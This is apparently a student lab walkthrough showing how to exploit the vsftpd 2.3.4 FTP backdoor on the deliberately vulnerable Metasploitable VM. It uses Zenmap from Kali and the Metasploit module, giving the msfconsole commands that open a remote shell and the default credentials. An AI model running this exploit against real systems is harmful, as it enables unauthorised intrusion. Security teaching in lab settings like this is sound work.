Task 1
For this task we will be using metasploitable and metasploit.

1) Launch Metasploitable environment. Login information: name: msfadmin; password: msfadmin.

2)Check IP address of Metasploitable. Using command: ifconfig
Here we need to ensure that settings of virtual box is correct. The network must be nat network.
Note down the IP address, for example 10.0.2.15 . We will use that later.

3)Open Kali, open Zenmap. We’ll use this to find vulnerabilities. The other option is to do it manually.
Enter the IP address we got from the last step in the target blank. Then click scan.

4)When scan is finished, we can a list of vulnerabilities of the system, but we will mainly talk about the ftp backdoor.
The version is vsftpd_234_backdoor

5)Then let’s exploit! Ref: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
Open metasploit in Kali.
Enter the following commands:
use exploit/unix/ftp/vsftpd_234_backdoor
// the following commands will be in msfconsole:.
show targets
show options
set RHOST (IP address of Metasploitable)

exploit
If the shell prompts that 1 shell session was opened, then the attack was successful are we are successfully inside the metasploitable2
machine. Now if we run these commands: 

  ifconfig (The ip address is the same with that of Metasploitable, we’re in that network, yeah!!)
  uname -a (It show the machine name [Linux Metasploitable2 ...]
  ls (Lists all the files of Metasploitable2 )
